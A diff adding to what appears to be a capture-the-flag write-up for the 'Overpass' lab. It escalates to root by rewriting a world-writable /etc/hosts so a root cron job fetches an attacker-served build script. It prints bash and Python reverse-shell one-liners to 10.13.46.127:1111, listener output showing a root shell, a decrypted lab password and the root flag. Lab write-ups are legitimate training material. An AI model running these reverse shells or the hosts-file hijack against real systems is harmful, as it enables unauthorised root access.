@@ -175,3 +175,51 @@ To Do:
 
 I decrypted this using rot47
 `[{"name":"System","pass":"saydrawnlyingpicture"}]`
+
+
+http://10.10.135.124/downloads/src/buildscript.sh
+```
+GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
+## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
+## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
+## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
+## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
+echo "$(date -R) Builds completed" >> /root/buildStatus
+```
+
+`bash -i >& /dev/tcp/10.13.46.127/1111 0>&1`
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.46.127",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+/etc/hosts is writable
+`-rw-rw-rw-  1 root root        250 Jun 27  2020 hosts`
+
+update /etc/hosts with my ip.
+```
+```
+
+recreate dir structure /downloads/src/buildscript.sh'
+```
+!#/bin/bash
+bash -i >& /dev/tcp/10.13.46.127/1111 0>&1
+```
+
+we are root!
+```
+└─$ nc -nvlp 1111                                                                                    
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1111
+Ncat: Listening on 0.0.0.0:1111
+Ncat: Connection from 10.10.135.124.
+Ncat: Connection from 10.10.135.124:34068.
+bash: cannot set terminal process group (1654): Inappropriate ioctl for device
+bash: no job control in this shell
+root@overpass-prod:~# 
+```
+
+fin
+```
+root@overpass-prod:~# cat /root/root.txt
+cat /root/root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+
+```
